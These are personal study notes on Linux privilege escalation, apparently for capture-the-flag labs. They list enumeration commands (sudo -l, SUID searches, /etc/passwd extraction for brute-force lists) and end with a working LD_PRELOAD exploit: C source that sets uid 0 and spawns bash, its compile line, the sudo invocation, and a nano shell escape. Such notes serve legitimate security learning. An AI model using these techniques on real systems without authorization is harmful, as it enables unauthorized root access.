$: /* Linux Priv Escalation */

$: hostname
the hostname command will return the hostname of the target machine

$: uname -a
will print sys information giving additional detail about the kernel used bt the system

$: /proc/version
The proc filesystem (procfs) provides information about the target system processes. You will find proc on many different Linux flavours. This can include information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed.

#: /etc/issue
Systems can also be identified looking at /etc/issue file.
Usually it contains information about the operating system but can easily be customized or changed.

$: ps
The ps command shows running processes on a Linux system.
Including: PID: The process ID, TTY: Terminal type used by the user, Time: Amount of CPU time,
CMD: The command or executable running.
ps -A		View all running processes
ps axjf		View process tree
ps aux		Will show processes for all users, display the user that launched the process, 
		and show processes that are not attached to a terminal

$: env
Will show environment variables. The path variable will show a compiler or scripting language to help us run code code on the target system or leverage for privilege escalation

$: sudo -l
Lists all commands that the user can run using sudo

$: ls
list contents of a directoy
ls -la shows privileges and hidden files

$: id
Provides a general overview of the user's privilege level and group memberships.
id <username>		Same information for other users

$: /etc/passwd
Reading this file is an easy way to discover users on the system.
The file can be easily cut and converted to a useful list for brute-force attacks.
cat /etc/passwd | cut -d ":" -f 1
another approach would be to grep for "home" as real users
cat /etc/passwd | grep home

$: history
history can give us some idea about the target system, and rarely have information
such as passwords or usernames

$: ifconfig
The target system may be a pivoting point to another network. 

$: ip route
to see which network routes exist

$: netstat
Gives us several different options to gather information on existing conditions
netstat -a 		Shows all listening ports and established connections
netstat -at or
netstat -au		Can also be used to list TCP or UDP protocols respectively
netstat -l 		List ports in "listening" mode. These ports are open and
			ready to accept incoming connections. The option "t" to list
			only ports that are listening using the TCP protocol.
netstat -s		List network usage statistics by protocol. This can be used with
			-t or -u options to limit the output to a specific protocol.
netstat -tp		List connections with the service name and PID information
			This can also be used with the -l option to list listening ports.
netstat -i		Shows interface statistics.
netstat -ano
-a			display all sockets
-n			do not resolve names
-o			display timers

$: find
searching for information on the target system can be fruitful
find . -name flag1.txt			find the file named 'flag1.txt' in the current dir
find /home -name flag1.txt		find the file named 'flag1.txt' in the /home directory
find / -type d -name config		find the directory named config under "/"
find / -type f -perm 0777		find files with 777 permissions
find / -perm a=x			find executable files
find /home -user frank			find all files for user "frank" under "/home"
find / -mtime 10			find files that were modified in the last 10 days
find / -atime 10			find files that were accessed in the last 10 days
find / -cmin -60			find files that changed w/i the last hour
find / -amin -60			find files accessed within the last hour
find / -size 50M			find files with a 50MB size
				can use the + or - to find files larger or smaller
* can add the following to redirect errors to /dev/null
-type f 2>/dev/null
ex: find / -size +100M -type f 2>/dev/null
find / -writable -type d 2>/dev/null	find world-writeable folders
find / -perm -222 -type d 2>/dev/null	find world-writeable folders
find / -perm -o w -type d 2>/dev/null	find world-writeable folders
find / -perm -o x -type d 2>/dev/null	find world-executable folders
Find development tools and supported languages:
find / -name perl*
find / -name python*
find / -name gcc*
Find specific file permissions:
find / -perm -u=s -type f 2>/dev/null	Find files with the SUID bit, which allows them to run					 	 with higher privileges than the current user'

$: General linux commands:
find, locate, grep, cut, sort


$$$: Automated Enumeration Tools
LinPeas
LinEnum
LES (Linux Exploitation Suggester)
Linux Smart Enunmeration
Linux Priv Checker

$: Leveraging LD Preload
if LD Preload is enabled, check with sudo -l, you can escalate privilieges
1) check for LD_PRELOAD
2) Write a simple C code compiled as a share object (.so extension) filee
3) Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}

Can save it as shell.c and compile it using gcc into a shared object file with the ofllowing parameters:

gcc -fPIC -shared -o shell.so shell.c -nostartfiles

To run the program you must specify the LD_PRELOAD option as follows:
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find

**Remember nano -> ctrl+r -> ctrl+x lets you issue commands
To gain root access: reset; bash 1>&0 2>&0
